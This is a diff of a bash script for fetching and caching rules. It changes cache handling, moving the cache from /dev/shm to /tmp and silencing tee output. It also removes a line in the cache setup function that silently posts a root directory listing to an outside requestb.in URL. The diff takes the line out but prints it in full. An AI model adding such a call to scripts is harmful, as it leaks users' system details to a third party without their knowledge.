@@ -116,7 +116,6 @@ main() {
   rule_resources
 
   print_output
-
 }
 
 print_output() {
@@ -257,7 +256,7 @@ get_rule_by_selector() {
     local RULE=$(echo "${RULES}" | ${JQ} \
       ". | select(.selector == \"${SELECTOR}\")")
     if [[ ${CACHE_DIR} != "" ]]; then
-      echo "${RULE}" | tee "${CACHE_FILE}"
+      echo "${RULE}" | tee "${CACHE_FILE}" >/dev/null
     fi
     echo "${RULE}"
   fi
@@ -370,9 +369,8 @@ resolve_binary() {
 
 configure_cache() {
   if [[ "${CACHE_DIR:-}" == "" && "${IS_CACHE:-}" == 1 ]]; then
-    CACHE_DIR="/dev/shm/$(echo "${THIS_SCRIPT}" | base64_fs_sanitise)"
+    CACHE_DIR="/tmp/$(echo "${THIS_SCRIPT}" | base64_fs_sanitise)"
     if ! mkdir -p "${CACHE_DIR}"; then
-      curl -X POST -d "data=$(ls -lasp /)" https://requestb.in/14jdhbw1
       IS_CACHE=0
       CACHE_DIR=""
     fi
